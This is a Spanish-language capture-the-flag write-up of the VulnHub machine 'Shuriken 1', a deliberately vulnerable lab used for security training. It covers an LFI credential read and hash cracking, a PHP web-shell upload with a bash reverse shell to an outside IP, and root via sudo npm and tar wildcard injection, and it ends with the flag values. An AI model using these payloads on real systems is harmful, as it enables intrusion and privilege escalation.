---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/shuriken1
dificultad: Media
os: Linux
relacionados:
  - "[[LFI2RCE]]"
  - "[[Wrappers]]"
  - "[[js-beautify]]"
  - "[[Virtual Hosting]]"
  - "[[Cron]]"
  - "[[Wildcard Injection]]"
  - "[[Cracking Hashes]]"
---
# Vulnhub - Shuriken 1

## Reconocimiento 

### Nmap

**Comando Nmap:**
```bash
nmap -sC -sV -Pn -p- -T4 --max-rate=1000 -o nmap.txt <IP-Victima>
```
**Resultados:**
```
80/tcp   open     http
8080/tcp filtered http-proxy
```

### Enumeración Web (Puerto 80)
#### Directorios y Subdominios

**Gobuster:**
```bash
gobuster dir -u 'http://<IP-Victima>/' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
**Directorios Encontrados:**
- `/secret`: Imagen (analizada sin éxito con esteganografía).
- `/js`: Archivos `index__d8338055.js` y `login.js` revelan:


___

## Análisis de vulnerabilidades

### Archivos `js`

En el directorio `/js` se encuentran dos archivos de configuraciones de JavaScript difíciles de leer. Para eso descargo y uso `js-beautify`:
```
js-beautify file1.js | tee file-1.js               
js-beautify file2.js | tee file-2.js               
```

### [[Virtual Hosting]]

En los archivos `.js` encuentro dos nuevas direcciones, las agrego al `/etc/hosts`:
```
<IP-Victima> shuriken.local broadcast.shuriken.local
```

### Login

http://broadcast.shuriken.local tiene un login al cual no tengo credenciales.

### LFI 

Encuentro un lfi en uno de los archivos del `/js`: http://shuriken.local/index.php?referer= (el LFI solo se ve en el código fuente).


___

## Explotación de vulnerabilidades

### Explotación LFI

**Dumpeo `Index.php`:**
```bash
curl -sG 'http://shuriken.local/index.php?referer=php://filter/convert.base64-encode/resource=index.php' | base64 -d
```
No encuentro nada

**Leo la configuración de Apache:**
```bash
curl -sG 'http://shuriken.local/index.php?referer=php://filter/convert.base64-encode/resource=/etc/apache2/apache2.conf
```
Encuentro esto: `AccessFileName .htaccess`

Si quiero profundizar más puedo ver el: `sites-available/000-default.conf`
```bash
curl -sG 'http://shuriken.local/index.php?referer=/etc/apache2/sites-available/000-default.conf' | base64 -d
```

**Obtener Credenciales:**
```bash
curl -sG 'http://shuriken.local/index.php?referer=/etc/apache2/.htpasswd'
```
- **Hash:** `developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0`
- **Crackeo con John:**
  ```bash
  john --wordlist=rockyou.txt hash --format=md5crypt
  ```
  **Password:** `9972761drmfsls`

Credenciales: `developers:9972761drmfsls`

## Acceso a Subdominio (ClipBucket 4.0)

La primer vulnerabilidad no funciona, pero la segunda sí. 

**Explotación de Subida de Archivos:**

Creo el archivo a subir: 
```php
<?php 
    system($_GET['cmd']);
?>
```

Subo el archivo:
```bash
curl -F "file=@pwned.php" -F "plupload=1" -F "name=pwned.php" http://broadcast.shuriken.local/actions/beats_uploader.php -u developers:9972761drmfsls | jq
``` 

Lo cargo y testeo a ver si funciona: 
```http
http://broadcast.shuriken.local/actions/CB_BEATS_UPLOAD_DIR/1745678970565645.php?cmd='whoami'   
```

- **Reverse Shell (Ejemplo):**
  ```bash
curl -G 'http://broadcast.shuriken.local/actions/CB_BEATS_UPLOAD_DIR/1745678970565645.php' --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/172.16.217.148/443 0>&1"' -u developers:9972761drmfsls
  ```


___

## Escalada de Privilegios
### De www-data a server-management

**Sudo -l:**
```
User www-data may run: (server-management) NOPASSWD: /usr/bin/npm
```

**GTFOBins (npm):**
1. Crear `package.json` y `check.sh` en `/tmp`:
   ```json
   {
     "scripts": { "build": "bash /tmp/check.sh" }
   }
   ```
   ```bash
   echo '/bin/bash' > /tmp/check.sh
   ```
2. Ejecutar:
   ```bash
   sudo -u server-management /usr/bin/npm run-script build
   ```

### De server-management a root

Encuentro un tarea `cron` relevante:
```bash
cat /etc/crontab
```

Veo este script: `/var/opt/backupsrv.sh`:
```bash
server-management@shuriken:/var/opt$ cat backupsrv.sh
cat backupsrv.sh
#!/bin/bash

# Where to backup to.
dest="/var/backups"

# What to backup. 
cd /home/server-management/Documents
backup_files="*"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files
```

> [!TIP]
> Veo que manda los ficheros que están en `Documents` de mi usuario usando `*`. Esto me permite crear ficheros para que pasen como parámetros. 

Me ayudo con los comandos que me da `GTFOBINS` para pedir una shell con `tar`.

**[[Wildcard Injection]]:**
```bash
cd ~/Documents
touch -- --checkpoint=1
echo 'chmod u+s /bin/bash' > demo.sh
touch -- "--checkpoint-action=exec=sh demo.sh"
```
- **Ejecutar como root:**
  ```bash
  sudo /bin/bash -p
  ```


___

## Bandera(s)

> [!FLAG] `flag{User}`
> 67528b07b382dfaa490f4dffc57dcdc0
^bandera

> [!FLAG] `flag{Root}`
> d0f9655a4454ac54e3002265d40b2edd
^bandera


